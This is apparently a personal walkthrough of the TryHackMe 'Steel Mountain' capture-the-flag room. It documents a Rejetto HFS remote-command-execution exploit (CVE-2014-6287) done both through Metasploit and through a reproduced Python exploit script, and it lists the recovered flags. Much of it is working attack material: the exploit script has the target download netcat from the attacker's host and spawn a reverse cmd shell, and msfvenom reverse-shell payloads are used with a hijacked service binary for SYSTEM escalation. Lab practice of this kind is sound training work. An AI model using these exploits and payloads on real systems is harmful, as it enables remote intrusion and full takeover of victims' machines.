# Advanced Exploitation

- Vulnerability Scanning
- Handling Public Exploits
- Password Cracking
- Port Redirection

## Steel Mountain
> https://tryhackme.com/room/steelmountain

<!-- MYIP=10.10.93.153 -->
MYIP=10.10.101.63
<!-- TARGET=10.10.170.98 -->
TARGET=10.10.52.3
nmap -sCV --min-rate 8888 -T4 -p- $TARGET
```nmap
Nmap scan report for ip-10-10-166-27.eu-west-1.compute.internal (10.10.166.27)
  Host is up, received arp-response (0.0017s latency).
  Scanned at 2023-02-25 14:27:22 GMT for 94s
  Not shown: 64434 closed ports, 1086 filtered ports
  Reason: 64434 resets and 1086 no-responses
  PORT      STATE SERVICE      REASON          VERSION
  80/tcp    open  http         syn-ack ttl 128 Microsoft IIS httpd 8.5
  135/tcp   open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
  139/tcp   open  netbios-ssn  syn-ack ttl 128 Microsoft Windows netbios-ssn
  445/tcp   open  microsoft-ds syn-ack ttl 128 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
  3389/tcp  open  ssl          syn-ack ttl 128 Microsoft SChannel TLS
  5985/tcp  open  http         syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  8080/tcp  open  http         syn-ack ttl 128 HttpFileServer httpd 2.3
  47001/tcp open  http         syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  49152/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
  49153/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
  49154/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
  49155/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
  49156/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
  49169/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
  49170/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
```

### Task1 
Who is the employee of the month?
> Bill Harper
```
go to port 80
save image, reverse google search
```

### Task3
Scan the machine with nmap. What is the other port running a web server on?
> 8080

Take a look at the other web server. What file server is running?
> Rejetto HTTP File Server
```
8080/tcp  open     http               syn-ack ttl 128 HttpFileServer httpd 2.3
|_http-title: HFS /
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
|_http-server-header: HFS 2.3

Go $TARGET:8080 on browser, view page source
<fieldset id='serverinfo'>
		<legend><img src="/~img0"> Server information</legend>
		<a href="http://www.rejetto.com/hfs/">HttpFileServer 2.3</a>
		<br />Server time: 4/1/2023 10:11:13 PM
		<br />Server uptime: 00:27:45
	</fieldset>
```
What is the CVE number to exploit this file server?
> 2014-6287

```
searchsploit "Rejetto 2.3"
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
[01;31m[KRejetto[m[K HTTP File Server (HFS) 2.2/[01;31m[K2.3[m[K - Arbitrary File Upload                      | multiple/remote/30850.txt
[01;31m[KRejetto[m[K HTTP File Server (HFS) [01;31m[K2.3[m[K.x - Remote Command Execution (1)                 | windows/remote/34668.txt
[01;31m[KRejetto[m[K HTTP File Server (HFS) [01;31m[K2.3[m[K.x - Remote Command Execution (2)                 | windows/remote/39161.py
[01;31m[KRejetto[m[K HTTP File Server (HFS) [01;31m[K2.3[m[Ka/[01;31m[K2.3[m[Kb/[01;31m[K2.3[m[Kc - Remote Command Execution            | windows/webapps/34852.txt
[01;31m[KRejetto[m[K HttpFileServer [01;31m[K2.3[m[K.x - Remote Command Execution (3)                         | windows/webapps/49125.py
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results


findsploit 2.3
___ _           _           _       _ _
/ __(_)_ __   __| |___ _ __ | | ___ (_) |_
/ _\ | | '_ \ / _` / __| '_ \| |/ _ \| | __|
/ /   | | | | | (_| \__ \ |_) | | (_) | | |_
\/    |_|_| |_|\__,_|___/ .__/|_|\___/|_|\__|
|_|

+ -- --=[ findsploit v2.0 by @xer0dayz
+ -- --=[ https://sn1persecurity.com

+ -- --=[ SEARCHING:  rejetto 2.3

+ -- --=[ NMAP SCRIPTS


+ -- --=[ METASPLOIT EXPLOIT S


+ -- --=[ EXPLOITDB EXPLOITS

bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
------------------------------------------------------------------------------------ ---------------------------------
Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                      | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                 | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                 | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution            | windows/webapps/34852.txt
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                         | windows/webapps/49125.py
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

https://www.exploit-db.com/search?q=rejetto 2.3++
https://www.google.ca/search?q=rejetto 2.3%20%20+exploit
https://www.google.ca/search?q=rejetto 2.3%20%20+exploit+site:www.securityfocus.com
https://www.google.ca/search?q=rejetto 2.3%20%20+site:0day.today
https://www.google.ca/search?q=rejetto 2.3%20%20+site:www.security-database.com
https://www.google.ca/search?q=rejetto 2.3%20%20+site:packetstormsecurity.com
https://exploits.shodan.io/?q=rejetto 2.3++
https://vulners.com/search?query=rejetto 2.3++


https://www.exploit-db.com/exploits/34926
CVE:
2014-6287

```

Use Metasploit to get an initial shell. What is the user flag?
> b04763b6fcf51fcd7c13abc7db4fd365
```
Ã¢â€â€Ã¢â€â‚¬# msfconsole -q
msf6 > search cve-2014-6287

Matching Modules
================

#  Name                                   Disclosure Date  Rank       Check  Description
-  ----                                   ---------------  ----       -----  -----------
0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > info

Name: Rejetto HttpFileServer Remote Command Execution
Module: exploit/windows/http/rejetto_hfs_exec
Platform: Windows
Arch:
Privileged: No
License: Metasploit Framework License (BSD)
Rank: Excellent
Disclosed: 2014-09-11

Provided by:
Daniele Linguaglossa <danielelinguaglossa@gmail.com>
Muhamad Fadzil Ramli <mind1355@gmail.com>

Available targets:
Id  Name
--  ----
0   Automatic

Check supported:
Yes

Basic options:
Name       Current Setting  Required  Description
----       ---------------  --------  -----------
HTTPDELAY  10               no        Seconds to wait before terminating web server
Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/
  Using-Metasploit
RPORT      80               yes       The target port (TCP)
  SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on
  the local machine or 0.0.0.0 to listen on all addresses.
  SRVPORT    8080             yes       The local port to listen on.
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /                yes       The path of the web application
URIPATH                     no        The URI to use for this exploit (default is random)
  VHOST                       no        HTTP server virtual host

  Payload information:
  Avoid: 3 characters

  Description:
  Rejetto HttpFileServer (HFS) is vulnerable to remote command
  execution attack due to a poor regex in the file ParserLib.pas. This
  module exploits the HFS scripting commands by using '%00' to bypass
  the filtering. This module has been tested successfully on HFS 2.3b
  over Windows XP SP3, Windows 7 SP1 and Windows 8.

  References:
https://nvd.nist.gov/vuln/detail/CVE-2014-6287
OSVDB (111386)
  https://seclists.org/bugtraq/2014/Sep/85
http://www.rejetto.com/wiki/index.php?title=HFS:_scripting_commands

msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.170.98
RHOSTS => 10.10.179.98
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080

msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.93.153:4444
[*] Using URL: http://10.10.93.153:8080/5WsgZ5tsviHoH
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /5WsgZ5tsviHoH
[*] Sending stage (175686 bytes) to 10.10.170.98
[!] Tried to delete %TEMP%\SlKJUoUF.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.93.153:4444 -> 10.10.170.98:49261) at 2023-04-02 05:43:04 +0000
[*] Server stopped.

meterpreter > sysinfo
Computer        : STEELMOUNTAIN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows


shell 

c:\Users\bill>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of c:\Users\bill

 09/27/2019  09:09 AM    <DIR>          .
 09/27/2019  09:09 AM    <DIR>          ..
 09/26/2019  11:29 PM    <DIR>          .groovy
 09/27/2019  04:07 AM    <DIR>          Contacts
 09/27/2019  09:08 AM    <DIR>          Desktop
 09/27/2019  04:07 AM    <DIR>          Documents
 09/27/2019  04:07 AM    <DIR>          Downloads
 09/27/2019  04:07 AM    <DIR>          Favorites
 09/27/2019  04:07 AM    <DIR>          Links
 09/27/2019  04:07 AM    <DIR>          Music
 09/27/2019  04:07 AM    <DIR>          Pictures
 09/27/2019  04:07 AM    <DIR>          Saved Games
 09/27/2019  04:07 AM    <DIR>          Searches
 09/27/2019  04:07 AM    <DIR>          Videos
 0 File(s)              0 bytes
 14 Dir(s)  44,170,067,968 bytes free


 c:\Users\bill>cd Desktop
 cd Desktop

 c:\Users\bill\Desktop>dir
 dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of c:\Users\bill\Desktop

 09/27/2019  09:08 AM    <DIR>          .
 09/27/2019  09:08 AM    <DIR>          ..
 09/27/2019  05:42 AM                70 user.txt
 1 File(s)             70 bytes
 2 Dir(s)  44,170,067,968 bytes free

 c:\Users\bill\Desktop>type user.txt
 type user.txt
 b04763b6fcf51fcd7c13abc7db4fd365
```

### TASK 3 PRIVILEGE ESCALATION

Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?

> AdvancedSystemCareService9

```
Download this powershell - https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

Ã¢â€â€Ã¢â€â‚¬# wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
--2023-04-02 12:43:26--  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 600580 (587K) [text/plain]
Saving to: 'PowerUp.ps1'

PowerUp.ps1             100%[==============================>] 586.50K  --.-KB/s    in 0.06s

2023-04-02 12:43:27 (10.0 MB/s) - 'PowerUp.ps1' saved [600580/600580]

meterpreter > upload ~/repo/PowerUp.ps1
[*] uploading  : /root/repo/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /root/repo/PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : /root/repo/PowerUp.ps1 -> PowerUp.ps1
meterpreter > pwd
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
meterpreter > load powershell
Loading extension powershell...Success.

meterpreter > powershell_shell
PS > pwd

 Directory: C:\Users\bill\Desktop


    Mode                LastWriteTime     Length Name
    ----                -------------     ------ ----
    -a---          4/2/2023   6:01 AM     600303 PowerUp.ps1
    -a---         9/27/2019   5:42 AM         70 user.txt


    PS > . .\PowerUp.ps1
    PS > Invoke-AllChecks

[+]======= HERE
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
[+]=======

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths
...
a lot more


```

The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.167.130 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe` -> nc -lvnp 4443

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.167.130 LPORT=4443 -f exe -o ASCService.exe` ->
Run Listener on the background
```
meterpreter > background
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.8.3.38
set LPORT 4443
run -j
```

Back to Old Session
```
shell # make sure to use cmd
sc stop AdvancedSystemCareService9

upload exploit
upload ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
sc start AdvancedSystemCareService9
```


MYIP=10.10.167.130
TARGET=10.10.195.134
You should be getting a shell now from your chosen listener
```
Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬(rootÃ£â€°Â¿kali)-[~/repo]
Ã¢â€â€Ã¢â€â‚¬# nc -lvnp 4443
listening on [any] 4443 ...
connect to [10.10.167.130] from (UNKNOWN) [10.10.195.134] 49243
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\>dir /s root.txt
dir /s root.txt
Volume in drive C has no label.
Volume Serial Number is 2E4A-906A

Directory of C:\Users\Administrator\Desktop

09/27/2019  05:41 AM                32 root.txt
1 File(s)             32 bytes


C:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314f57607c00fd09803a587db80
```

### TASK 4 Access And Escalation Without Metasploit

Download the exploit
```
wget https://www.exploit-db.com/download/39161
mv 39161 exploit.py

```

download ncat to windows
```
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/ncat.exe
mv ncat.exe nc.exe 
```

serve python webserver to host nc.exe
python -m http.server 8888

edit exploit.py

change ip_addr = your attacker IP
add port 8888 to vbs
```python
import urllib2
import sys

try:
	def script_create():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

	def execute_script():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

	def nc_run():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

	ip_addr = "192.168.44.128" #local IP address
	local_port = "443" # Local Port number
	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+  ":8888"     +"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
	save= "save|" + vbs
	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
	exe= "exec|"+vbs2
	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
	exe1= "exec|"+vbs3
	script_create()
	execute_script()
	nc_run()
except:
	print """[.]Something went wrong..!
	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
	Don't forgot to change the Local IP address and Port number on the script"""
```

python2 exploit.py 10.10.202.24 8080

https://github.com/carlospolop/PEASS-ng/releases/tag/20220717

wget https://github.com/carlospolop/PEASS-ng/releases/download/20220717/winPEASx64.exe 
mv winPEASx64.exe winPEAS.exe 
powershell -c wget "http://<attacker ip>:8888/winPEAS.exe" -outfile "winPEAS.exe"
powershell -c wget "http://10.10.68.193:8888/winPEAS.exe" -outfile "winPEAS.exe"
```
Services Information
Interesting Services -non Microsoft-
Check if you can overwrite some service binary or perform a DL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-
privilege-escalation#services
AdvancedSystemCareService9(I0bit - Advanced SystemCare Service 9)[C:\Program Files (x86) \I0bit\Advanced SystemCare\ASCService.exe]
- Auto - Running - No quotes an
d Space detected
File Permissions: bill [WriteData/Createfiles]
Possible DLL Hijacking in binary folder: C:\Program Files (x86)\I0bit\Advanced SystemCare (bill (WriteData/CreateFiles])
```
powershell -c Get-Service

Now We can  escalate our privileges
Generate your payload using msfvenom and pull it to the system using powershell.

```
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP> LPORT=443 -e x86/shikata_ga_nai -f exe -o Advanced.exe
```

Now we can move our payload to the unquoted directory winPEAS alerted us to and restart the service with two commands.

```
move Advance.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
sc stop AdvancedSystemCareService9

Shortly followed by;

sc start AdvancedSystemCareService9

Once this command runs, you will see you gain a shell as Administrator on our listener!
```



## Alfred

## HackPark

## GameZone

## Skynet

## Daily Bugle

## Overpass 2 - Hacked

## Relevant

## Internal